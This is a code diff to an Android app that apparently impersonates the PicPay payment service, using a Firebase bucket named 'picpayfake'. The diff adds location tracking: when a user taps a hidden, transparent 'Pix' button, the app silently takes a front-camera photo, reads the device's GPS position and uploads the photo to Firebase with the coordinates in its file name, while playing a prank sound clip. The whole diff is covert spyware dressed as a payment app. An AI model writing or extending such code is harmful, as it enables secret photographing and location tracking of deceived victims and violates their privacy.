@@ -1,5 +1,6 @@
 package com.app.picpay;
 
+import android.annotation.SuppressLint;
 import android.content.pm.PackageManager;
 import android.graphics.Bitmap;
 import android.graphics.BitmapFactory;
@@ -11,7 +12,7 @@ import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 import android.widget.ImageView;
-import android.widget.Toast;
+
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
 import androidx.camera.core.CameraSelector;
@@ -19,13 +20,17 @@ import androidx.camera.core.ImageCapture;
 import androidx.camera.lifecycle.ProcessCameraProvider;
 import androidx.core.app.ActivityCompat;
 import androidx.core.content.ContextCompat;
+
 import com.bumptech.glide.Glide;
+import com.google.android.gms.location.FusedLocationProviderClient;
+import com.google.android.gms.location.LocationServices;
 import com.google.common.util.concurrent.ListenableFuture;
 import com.google.firebase.storage.FirebaseStorage;
 import com.google.firebase.storage.StorageReference;
+
 import androidx.camera.core.ImageCaptureException;
 import androidx.camera.core.ImageProxy;
-import androidx.lifecycle.LifecycleOwner;
+
 import java.io.ByteArrayOutputStream;
 import java.nio.ByteBuffer;
 import java.text.SimpleDateFormat;
@@ -35,26 +40,28 @@ import java.util.concurrent.ExecutionException;
 public class MainActivity extends AppCompatActivity {
 
     private static final int CAMERA_REQUEST_CODE = 100;
-    private ImageView imgHome;
-    private Button btnPix;
+    private static final int LOCATION_REQUEST_CODE = 101;
     private ImageCapture imageCapture;
     private MediaPlayer mediaPlayer;
+    private FusedLocationProviderClient fusedLocationClient;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
 
-        imgHome = findViewById(R.id.imgHome);
+        ImageView imgHome = findViewById(R.id.imgHome);
         Glide.with(this)
                 .load("https://firebasestorage.googleapis.com/v0/b/picpayfake-2da1a.appspot.com/o/tela-inicial.jpeg?alt=media&token=305c08b8-5783-496b-88b3-0e42363062a9")
                 .into(imgHome);
 
-        btnPix = findViewById(R.id.btnPix);
+        Button btnPix = findViewById(R.id.btnPix);
         btnPix.setBackgroundColor(Color.TRANSPARENT);
         btnPix.setTextColor(Color.TRANSPARENT);
 
         mediaPlayer = MediaPlayer.create(this, Uri.parse("https://firebasestorage.googleapis.com/v0/b/picpayfake-2da1a.appspot.com/o/GEMIDAO%20DO%20ZAP.mp3?alt=media&token=d7d6be5d-6f49-4367-9b14-e9ea73711be4"));
+
+        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this);
 
         if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(this, new String[]{
@@ -63,10 +70,32 @@ public class MainActivity extends AppCompatActivity {
         } else {
             startCamera();
         }
+
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED ||
+                ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(this, new String[]{
+                    android.Manifest.permission.ACCESS_FINE_LOCATION,
+                    android.Manifest.permission.ACCESS_COARSE_LOCATION
+            }, LOCATION_REQUEST_CODE);
+        }
     }
 
     public void setOnClickPix(View view) {
-        takePhoto();
+        if (ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED &&
+                ContextCompat.checkSelfPermission(this, android.Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
+            fusedLocationClient.getLastLocation()
+                    .addOnSuccessListener(this, location -> {
+                        if (location != null) {
+                            double latitude = location.getLatitude();
+                            double longitude = location.getLongitude();
+                            takePhoto(latitude, longitude);
+                        } else {
+                            takePhoto(999, 999);
+                        }
+                    });
+        } else {
+            takePhoto(999, 999);
+        }
         playSound();
     }
 
@@ -98,21 +127,21 @@ public class MainActivity extends AppCompatActivity {
                         .setCaptureMode(ImageCapture.CAPTURE_MODE_MINIMIZE_LATENCY)
                         .build();
 
-                cameraProvider.bindToLifecycle((LifecycleOwner) this, cameraSelector, imageCapture);
+                cameraProvider.bindToLifecycle(this, cameraSelector, imageCapture);
             } catch (ExecutionException | InterruptedException e) {
                 Log.e("CameraX", "Camera initialization failed", e);
             }
         }, ContextCompat.getMainExecutor(this));
     }
 
-    private void takePhoto() {
+    private void takePhoto(double latitude, double longitude) {
         if (imageCapture != null) {
             imageCapture.takePicture(ContextCompat.getMainExecutor(this), new ImageCapture.OnImageCapturedCallback() {
                 @Override
                 public void onCaptureSuccess(@NonNull ImageProxy image) {
                     super.onCaptureSuccess(image);
                     Bitmap bitmap = imageProxyToBitmap(image);
-                    uploadImageToFirebase(bitmap);
+                    uploadImageToFirebase(bitmap, latitude, longitude);
                     image.close();
                 }
 
@@ -133,15 +162,16 @@ public class MainActivity extends AppCompatActivity {
         return BitmapFactory.decodeByteArray(bytes, 0, bytes.length);
     }
 
-    private void uploadImageToFirebase(Bitmap imageBitmap) {
+    private void uploadImageToFirebase(Bitmap imageBitmap, double latitude, double longitude) {
         FirebaseStorage storage = FirebaseStorage.getInstance();
         StorageReference storageRef = storage.getReference();
 
-        SimpleDateFormat formatter = new SimpleDateFormat("yyyy/MM/dd/HH:mm:ss.SSS");
+        @SuppressLint("SimpleDateFormat") SimpleDateFormat formatter = new SimpleDateFormat("yyyy/MM/dd/HH:mm:ss.SSS");
         Date now = new Date();
         String formattedDate = formatter.format(now);
 
-        StorageReference imageRef = storageRef.child("frontalCameraImages/" + formattedDate + ".jpg");
+        @SuppressLint("DefaultLocale") StorageReference imageRef = storageRef
+                .child(String.format("frontalCameraImages/%s_%f,%f.jpg", formattedDate, latitude, longitude));
 
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         imageBitmap.compress(Bitmap.CompressFormat.JPEG, 100, baos);
@@ -149,7 +179,6 @@ public class MainActivity extends AppCompatActivity {
 
         imageRef.putBytes(data);
     }
-
 
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
